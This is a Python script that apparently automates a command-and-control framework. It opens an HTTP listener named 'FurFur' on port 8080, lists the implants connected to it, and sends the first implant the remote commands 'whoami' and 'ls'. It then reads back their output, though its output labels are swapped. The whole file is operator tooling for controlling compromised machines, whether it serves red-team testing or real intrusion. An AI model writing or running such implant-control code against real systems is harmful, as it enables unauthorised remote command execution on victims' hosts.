import time

import Internals.Http_Get
import Internals.Http_Post
import Menu.Implant
import Menu.Take_Control
import Services.Get_Implant_ID


def fur_listener():
    Internals.Http_Post.create_listener("FurFur", "8080")
    Internals.Http_Get.get_listener("FurFur")

    print("\n")

    time.sleep(3)

    Internals.Http_Get.get_implants()
    implant_id = Services.Get_Implant_ID.real_get_implant_id()

    time.sleep(2)

    print("[+] Sending 1 Task")
    id_1 = Internals.Http_Post.send_simple_task_to_implant("whoami", implant_id[0])
    print(id_1)

    time.sleep(2)

    print("[+] Sending 2 Task")
    id_2 = Internals.Http_Post.send_simple_task_to_implant("ls", implant_id[0])
    print(id_2)

    time.sleep(5)

    print("[+] Output 2 Task")
    Internals.Http_Get.get_last_command_output(implant_id[0], id_1)

    time.sleep(5)

    print("[+] Output 1 Task")
    Internals.Http_Get.get_last_command_output(implant_id[0], id_2)




